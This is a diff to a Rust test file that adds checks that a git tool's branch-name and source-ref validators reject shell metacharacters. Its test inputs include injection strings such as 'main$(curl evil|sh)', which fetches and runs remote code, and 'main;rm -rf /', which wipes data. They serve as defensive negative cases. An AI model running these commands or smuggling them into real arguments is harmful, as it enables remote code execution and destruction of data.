@@ -1,5 +1,5 @@
 use wisetree::utils::validation::{
-    normalize_branch_name, validate_branch_name, validate_directory_name,
+    normalize_branch_name, validate_branch_name, validate_directory_name, validate_source_ref,
 };
 
 #[test]
@@ -127,6 +127,61 @@ fn branch_invalid_chars() {
             "expected {s} rejected"
         );
     }
+}
+
+#[test]
+fn branch_rejects_shell_metacharacters() {
+    for s in [
+        "main;rm",
+        "main$evil",
+        "main`whoami`",
+        "main&background",
+        "main|pipe",
+        "main\"quote",
+        "main'quote",
+        "main(",
+        "main)",
+        "main{brace}",
+        "main!bang",
+        "main\nnewline",
+    ] {
+        assert_eq!(
+            validate_branch_name(s),
+            Some("Branch name contains invalid characters"),
+            "expected {s:?} rejected"
+        );
+    }
+}
+
+#[test]
+fn source_ref_accepts_remote_tag_and_sha() {
+    assert_eq!(validate_source_ref("origin/main"), None);
+    assert_eq!(validate_source_ref("v1.0.0"), None);
+    assert_eq!(validate_source_ref("abc123f"), None);
+    assert_eq!(validate_source_ref("HEAD"), None);
+}
+
+#[test]
+fn source_ref_rejects_shell_metacharacters() {
+    for s in [
+        "main$(curl evil|sh)",
+        "main;rm -rf /",
+        "main`whoami`",
+        "main|x",
+        "main\nfoo",
+    ] {
+        assert_eq!(
+            validate_source_ref(s),
+            Some("Ref contains invalid characters"),
+            "expected {s:?} rejected"
+        );
+    }
+}
+
+#[test]
+fn source_ref_rejects_empty_and_leading_dash() {
+    assert_eq!(validate_source_ref(""), Some("Ref cannot be empty"));
+    assert_eq!(validate_source_ref("-foo"), Some("Ref cannot start with -"));
 }
 
 #[test]
